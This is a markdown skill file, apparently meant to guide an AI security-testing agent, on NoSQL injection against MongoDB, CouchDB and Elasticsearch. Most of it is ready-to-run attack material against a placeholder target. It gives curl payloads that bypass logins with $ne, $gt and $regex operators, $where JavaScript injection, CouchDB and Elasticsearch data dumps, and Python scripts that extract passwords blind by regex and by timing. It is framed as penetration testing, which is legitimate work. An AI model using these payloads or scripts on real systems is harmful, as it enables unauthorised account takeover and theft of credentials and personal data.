---
name: nosql-injection
description: NoSQL injection testing for MongoDB, CouchDB, and Elasticsearch including operator injection, authentication bypass, and blind data extraction
---

# NoSQL Injection

NoSQL injection exploits the lack of parameterized queries in document-oriented and key-value databases. Unlike SQL, NoSQL queries use JSON operators, JavaScript evaluation, and document matching — each with distinct injection vectors that are invisible to SQL-focused scanners.

## Attack Surface

- Any endpoint accepting JSON input that queries MongoDB, CouchDB, DynamoDB, Elasticsearch, Redis, or Cassandra
- Login/authentication endpoints, search/filter endpoints, user profile lookups, API queries
- Parameters passed as query strings that are parsed into JSON objects server-side (Express `qs` parser)

## Reconnaissance

### Detection Signals

- JSON-accepting endpoints (Content-Type: application/json)
- Node.js/Express, Python/Flask/Django with PyMongo, PHP with MongoDB driver
- Error messages: `MongoError`, `CastError`, `BSONTypeError`, `ValidationError`
- Express.js `qs` module (parses `user[$ne]=` from query strings into `{user: {$ne: ""}}`)

### Endpoints to Test

- `/api/login`, `/api/auth`, `/api/users`, `/api/search`, `/api/filter`
- Any endpoint with ID lookups: `/api/user/:id`, `/api/item/:id`
- GraphQL resolvers backed by MongoDB

## Key Vulnerabilities

### Authentication Bypass (Operator Injection)

```bash
# JSON body — bypass login with $ne (not equal to empty)
curl -sk https://TARGET/api/login -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# JSON body — bypass with $gt (greater than empty string)
curl -sk https://TARGET/api/login -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# JSON body — regex match all
curl -sk https://TARGET/api/login -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'

# JSON body — $in operator with common usernames
curl -sk https://TARGET/api/login -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":""}}'
```

### Query String Operator Injection (Express qs parser)

```bash
# Express qs module converts these to MongoDB operators automatically
curl -sk "https://TARGET/api/login?username[$ne]=&password[$ne]="
curl -sk "https://TARGET/api/login?username[$gt]=&password[$gt]="
curl -sk "https://TARGET/api/login?username[$regex]=.*&password[$regex]=.*"
curl -sk "https://TARGET/api/users?role[$ne]=guest"
curl -sk "https://TARGET/api/items?price[$lt]=0"
curl -sk "https://TARGET/api/search?query[$regex]=admin"
```

### JavaScript Injection ($where)

```bash
# $where allows arbitrary JavaScript execution in MongoDB
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"$where":"this.username == \"admin\""}'

# Sleep-based detection
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"$where":"sleep(5000) || true"}'

# Data exfiltration via $where timing
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"$where":"if(this.password.match(/^a/)) sleep(5000)"}'
```

### MongoDB-Specific Operators

```bash
# $exists — enumerate fields
curl -sk https://TARGET/api/users -X POST -H "Content-Type: application/json" \
  -d '{"password":{"$exists":true}}'

# $type — type confusion
curl -sk https://TARGET/api/users -X POST -H "Content-Type: application/json" \
  -d '{"admin":{"$type":8}}' # 8 = boolean type

# $elemMatch — array field injection
curl -sk https://TARGET/api/users -X POST -H "Content-Type: application/json" \
  -d '{"roles":{"$elemMatch":{"$eq":"admin"}}}'

# $size — array length probing
curl -sk https://TARGET/api/users -X POST -H "Content-Type: application/json" \
  -d '{"tokens":{"$size":0}}'
```

### Elasticsearch Injection

```bash
# Query DSL injection
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"query":{"match_all":{}}}'

# Script injection (if scripting enabled)
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"query":{"bool":{"filter":{"script":{"script":"true"}}}}}'

# Wildcard data dump
curl -sk https://TARGET/api/search -X POST -H "Content-Type: application/json" \
  -d '{"query":{"wildcard":{"username":{"value":"*"}}}}'
```

### CouchDB Injection

```bash
# Mango query injection
curl -sk https://TARGET/_find -X POST -H "Content-Type: application/json" \
  -d '{"selector":{"password":{"$regex":".*"}},"fields":["_id","username","password"]}'

# View enumeration
curl -sk https://TARGET/_all_dbs
curl -sk https://TARGET/database/_all_docs?include_docs=true
```

## Advanced Techniques

### Blind NoSQL Extraction (Regex-based)

```python
import requests, string

url = "https://TARGET/api/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
extracted = ""

for i in range(32):
    found = False
    for c in charset:
        escaped = c.replace("\\", "\\\\").replace(".", "\\.").replace("*", "\\*")
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{extracted}{escaped}"}
        }
        r = requests.post(url, json=payload, verify=False, timeout=10)
        if r.status_code == 200 and "token" in r.text:
            extracted += c
            print(f"Found: {extracted}")
            found = True
            break
    if not found:
        break

print(f"Extracted password: {extracted}")
```

### Timing-based Blind Extraction

```python
import requests, time, string

url = "https://TARGET/api/search"
charset = string.ascii_lowercase + string.digits
extracted = ""

for i in range(32):
    found = False
    for c in charset:
        payload = {
            "$where": f"if(this.password.charAt({i})=='{c}') sleep(3000); else return true"
        }
        start = time.time()
        try:
            r = requests.post(url, json=payload, verify=False, timeout=10)
        except:
            pass
        elapsed = time.time() - start

        if elapsed > 2.5:
            extracted += c
            print(f"Position {i}: {c} (total: {extracted})")
            found = True
            break
    if not found:
        break
```

### PHP-specific Array Injection

```bash
# PHP converts array params to MongoDB operators
curl -sk "https://TARGET/login.php" -X POST \
  -d "username[$ne]=x&password[$ne]=x"

curl -sk "https://TARGET/login.php" -X POST \
  -d "username[$regex]=admin&password[$gt]="

curl -sk "https://TARGET/login.php" -X POST \
  -d "username=admin&password[$regex]=.*"
```

## Testing Methodology

1. **Identify NoSQL backend** — look for MongoDB/CouchDB/Elasticsearch indicators in headers, errors, tech stack
2. **Test operator injection** — `$ne`, `$gt`, `$regex` in both JSON body and query string positions
3. **Test $where injection** — if MongoDB, try JavaScript evaluation with sleep-based detection
4. **Attempt auth bypass** — try operator injection on login/auth endpoints first (highest impact)
5. **Extract data blind** — if auth bypass works, use regex/timing extraction for credentials
6. **Test Express qs parsing** — try `param[$operator]=value` format in query strings

## Validation

1. Successful authentication bypass via operator injection (show token/session returned)
2. Data extraction via blind regex or timing (show extracted password characters)
3. Error messages confirming MongoDB/NoSQL backend
4. $where JavaScript execution confirmed via timing difference

## False Positives

- Application returns 200 for all login attempts (check if response content differs)
- WAF blocking special characters (try URL encoding operators)
- Application uses parameterized queries / ODM validation (Mongoose schema validation)
- $where disabled in MongoDB 4.4+ by default (mongosh)

## Impact

- Authentication bypass → full account takeover
- Data exfiltration from document stores (credentials, PII, secrets)
- Server-side JavaScript execution via $where → potential RCE
- Privilege escalation through operator-based role manipulation

## Pro Tips

1. Always test BOTH JSON body AND query string — Express `qs` module auto-converts `param[$ne]=` to MongoDB operators
2. If JSON body injection fails, try nested objects: `{"username": {"$ne": null}}` vs `{"username": {"$ne": ""}}`
3. MongoDB errors often leak collection names and field names — use these for targeted extraction
4. Test `$exists` operator to enumerate hidden fields (isAdmin, role, permissions, apiKey)
5. Against Mongoose (ODM), try bypassing type validation with string-to-object coercion
6. Use `$regex` with `$options: "i"` for case-insensitive matching during blind extraction
7. Test for server-side JS injection even if $where is blocked — check `$function`, `$accumulator` (MongoDB 4.4+)
8. CouchDB Mango queries and Elasticsearch Query DSL have their own injection grammars — don't assume MongoDB
